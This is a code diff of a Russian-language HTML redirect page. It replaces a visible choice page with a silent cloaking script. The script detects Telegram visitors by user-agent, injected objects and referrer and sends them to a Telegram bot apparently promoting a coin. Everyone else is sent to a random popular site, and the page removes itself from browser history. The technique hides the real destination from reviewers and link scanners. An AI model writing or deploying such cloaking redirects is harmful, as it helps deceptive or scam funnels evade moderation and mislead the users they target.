@@ -3,146 +3,108 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Выберите действие</title>
-  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Перенаправление...</title>
+  <script>
+    (function() {
+      // === НАСТРОЙКИ ===
+      // Ссылка на бота для Telegram
+      const TELEGRAM_BOT_LINK = 'https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe';
+      
+      // Список сайтов для обычных браузеров (случайный выбор)
+      const REGULAR_SITES = [
+        'https://www.google.com',
+        'https://www.youtube.com',
+        'https://www.instagram.com',
+        'https://vk.com',
+        'https://dzen.ru',
+        'https://www.facebook.com',
+        'https://www.tiktok.com',
+        'https://twitter.com'
+      ];
+      
+      // === УЛУЧШЕННОЕ ОПРЕДЕЛЕНИЕ TELEGRAM ===
+      function isTelegramWebView() {
+        // 1. Проверка User-Agent (регистронезависимая, с расширенными паттернами)
+        const ua = navigator.userAgent.toLowerCase();
+        const telegramPatterns = [
+          'telegram',       // стандартный маркер
+          'tdesktop',       // десктопная версия
+          'telegrambot',    // некоторые боты
+          'tgweb',          // внутренние webview
+          'telegramweb'     // вариант
+        ];
+        
+        for (let pattern of telegramPatterns) {
+          if (ua.includes(pattern)) {
+            console.log('[Detect] Telegram по User-Agent:', pattern);
+            return true;
+          }
+        }
+        
+        // 2. Проверка специфичных объектов Telegram (для WebApp / Mini App)
+        //    Некоторые версии Telegram WebView внедряют эти объекты
+        if (
+          typeof window.TelegramWebviewProxy !== 'undefined' ||
+          typeof window.TelegramGameProxy !== 'undefined' ||
+          typeof window.Telegram !== 'undefined'
+        ) {
+          console.log('[Detect] Telegram по JavaScript объектам');
+          return true;
+        }
+        
+        // 3. Проверка Referrer (если открыто из чата или канала)
+        try {
+          const referrer = document.referrer.toLowerCase();
+          if (referrer.includes('t.me') || referrer.includes('telegram')) {
+            console.log('[Detect] Telegram по Referrer:', referrer);
+            return true;
+          }
+        } catch(e) {}
+        
+        return false;
+      }
+      
+      // === ВЫБОР ЦЕЛЕВОЙ ССЫЛКИ ===
+      let targetUrl;
+      const isTelegram = isTelegramWebView();
+      
+      if (isTelegram) {
+        targetUrl = TELEGRAM_BOT_LINK;
+        console.log('[Редирект] Telegram -> бот:', targetUrl);
+      } else {
+        // Случайный сайт из списка
+        const randomIndex = Math.floor(Math.random() * REGULAR_SITES.length);
+        targetUrl = REGULAR_SITES[randomIndex];
+        console.log('[Редирект] Обычный браузер -> случайный сайт:', targetUrl);
+      }
+      
+      // === МГНОВЕННЫЙ РЕДИРЕКТ (без сохранения в истории) ===
+      // Используем replace, чтобы кнопка "назад" не возвращала на эту страницу
+      window.location.replace(targetUrl);
+      
+      // === ФОЛБЭК НА СЛУЧАЙ, ЕСЛИ replace НЕ СРАБОТАЛ (например, блокировка) ===
+      setTimeout(function() {
+        if (window.location.href === window.location.href) { // простая проверка
+          window.location.href = targetUrl;
+        }
+      }, 100);
+    })();
+  </script>
+  <!-- Дополнительная защита для очень старых браузеров / отключённого JS -->
+  <noscript>
+    <meta http-equiv="refresh" content="0; url=https://www.google.com">
+  </noscript>
+</head>
+<body style="margin:0; padding:0; background:#0a0f1e; display:flex; align-items:center; justify-content:center; min-height:100vh; font-family:system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;">
+  <div style="text-align:center; color:#e0e0e0; padding:20px;">
+    <div style="display:inline-block; width:44px; height:44px; border-radius:50%; border:3px solid #2d8cff; border-top-color:transparent; animation:spin 0.8s linear infinite; margin-bottom:16px;"></div>
+    <p style="font-size:16px; opacity:0.8;">Перенаправление, пожалуйста, подождите...</p>
+  </div>
   <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      text-align: center;
-      padding: 40px 20px;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      min-height: 100vh;
-      margin: 0;
-    }
-    .container {
-      max-width: 400px;
-      margin: 0 auto;
-      background: white;
-      border-radius: 20px;
-      padding: 30px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-    }
-    h1 {
-      color: #333;
-      margin-bottom: 10px;
-      font-size: 24px;
-    }
-    .subtitle {
-      color: #666;
-      margin-bottom: 30px;
-      font-size: 14px;
-    }
-    .btn {
-      display: block;
-      width: 100%;
-      padding: 18px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 12px;
-      font-size: 16px;
-      font-weight: bold;
-      text-decoration: none;
-      cursor: pointer;
-      transition: transform 0.2s;
-    }
-    .btn:active {
-      transform: scale(0.98);
-    }
-    .btn-telegram {
-      background: #0088cc;
-      color: white;
-    }
-    .btn-random {
-      background: #28a745;
-      color: white;
-    }
-    .info {
-      margin-top: 20px;
-      padding: 15px;
-      background: #f8f9fa;
-      border-radius: 8px;
-      font-size: 12px;
-      color: #666;
-    }
-    .loader {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #0088cc;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
     @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      to { transform: rotate(360deg); }
     }
   </style>
-</head>
-<body>
-  <div class="container">
-    <h1>🤖 Добро пожаловать!</h1>
-    <p class="subtitle">Выберите, куда перейти:</p>
-    
-    <div id="loader" class="loader"></div>
-    
-    <div id="buttons" style="display: none;">
-      <a href="https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe" class="btn btn-telegram">
-        💬 Открыть Telegram бота
-      </a>
-      
-      <button onclick="goToRandom()" class="btn btn-random">
-        🎲 Случайный сайт
-      </button>
-    </div>
-    
-    <div class="info">
-      <strong>Информация:</strong><br>
-      <span id="ua-info">Загрузка...</span>
-    </div>
-  </div>
-
-  <script>
-    const ua = navigator.userAgent || '';
-    const vendor = navigator.vendor || '';
-    
-    // Показываем User-Agent для отладки
-    document.getElementById('ua-info').textContent = ua.substring(0, 100) + '...';
-    
-    const sites = [
-      'https://www.google.com',
-      'https://www.youtube.com',
-      'https://vk.com',
-      'https://dzen.ru'
-    ];
-    
-    // Проверяем Telegram
-    const isTelegram = 
-      /Telegram/i.test(ua) || 
-      /TelegramBot/i.test(ua) ||
-      /wv/.test(ua);
-    
-    // Скрываем загрузчик, показываем кнопки
-    setTimeout(() => {
-      document.getElementById('loader').style.display = 'none';
-      document.getElementById('buttons').style.display = 'block';
-      
-      // Если определили Telegram — автоматически переходим через 2 секунды
-      if (isTelegram) {
-        document.querySelector('.subtitle').textContent = 'Обнаружен Telegram! Перенаправление...';
-        setTimeout(() => {
-          window.location.href = 'https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe';
-        }, 2000);
-      } else {
-        document.querySelector('.subtitle').textContent = 'Выберите действие:';
-      }
-    }, 1000);
-    
-    function goToRandom() {
-      const randomIndex = Math.floor(Math.random() * sites.length);
-      window.location.replace(sites[randomIndex]);
-    }
-  </script>
 </body>
 </html>
